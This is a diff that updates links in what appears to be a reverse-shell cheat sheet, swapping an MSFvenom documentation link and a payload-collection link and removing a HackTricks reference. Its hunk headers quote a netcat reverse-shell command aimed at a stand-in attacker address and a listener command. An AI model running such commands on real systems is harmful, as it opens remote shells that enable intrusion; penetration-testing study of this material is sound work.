@@ -39,7 +39,7 @@ nc.exe -e cmd.exe ATTACKER_IP PORT
 ## 🛠️ Tools
 
 - [Ncat (from Nmap)](https://nmap.org/ncat/) – Advanced netcat replacement.
-- [MSFvenom](https://docs.rapid7.com/metasploit/msfvenom/) – Payload generator for Windows/Linux shells.
+- [MSFvenom](https://www.offsec.com/metasploit-unleashed/msfvenom/) – Payload generator for Windows/Linux shells.
 - [socat](http://www.dest-unreach.org/socat/) – Flexible tool for socket communication and reverse shells.
 - [chisel](https://github.com/jpillora/chisel) – TCP/UDP tunneling over HTTP, often used for reverse shells via HTTP.
 
@@ -48,7 +48,7 @@ nc.exe -e cmd.exe ATTACKER_IP PORT
 ## 📦 Payload Generators
 
 - [Reverse Shell Generator](https://www.revshells.com/)
-- [PayloadsAllTheThings – Reverse Shells](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet)
+- [InternalAllTheThings – Reverse Shells](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/)
 
 ---
 
@@ -86,4 +86,3 @@ nc -lvnp PORT
 ## 📚 References
 
 - [GTFOBins – reverse shell](https://gtfobins.github.io)
-- [HackTricks – reverse shell](https://book.hacktricks.xyz/pentesting-web/reverse-shell-cheatsheet)
